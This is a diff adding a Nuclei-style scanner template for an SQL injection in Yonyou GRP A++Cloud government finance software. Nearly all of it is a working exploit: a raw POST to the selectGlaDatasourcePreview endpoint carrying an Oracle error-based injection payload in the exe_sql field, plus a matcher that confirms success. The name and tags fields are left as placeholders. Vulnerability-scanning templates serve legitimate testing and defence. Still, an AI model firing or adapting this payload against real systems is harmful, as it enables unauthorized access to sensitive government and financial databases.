@@ -1,0 +1,29 @@
+id: yongyou-A-selectGlaDatasourcePreview-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 用友政务软件有限公司由用友（集团）和中国财政科学研究院共同设立，是面向政府部门、事业单位、非营利组织的全方位业务管理信息化解决方案提供商，是中国电子政务百强企业、中国领先的公共财政管理软件提供商、中国领先的行政事业单位计划财务管理软件提供商。公司的业务涵盖财政、银行、税务、社保、民生、公安、交通、海关、国土资源等行业。用友GRP A++Cloud政府财务云exe_sql存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-A-Cloud%E6%94%BF%E5%BA%9C%E8%B4%A2%E5%8A%A1%E4%BA%91%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3selectGlaDatasourcePreview%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 279
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qzkjq1qbvkq'
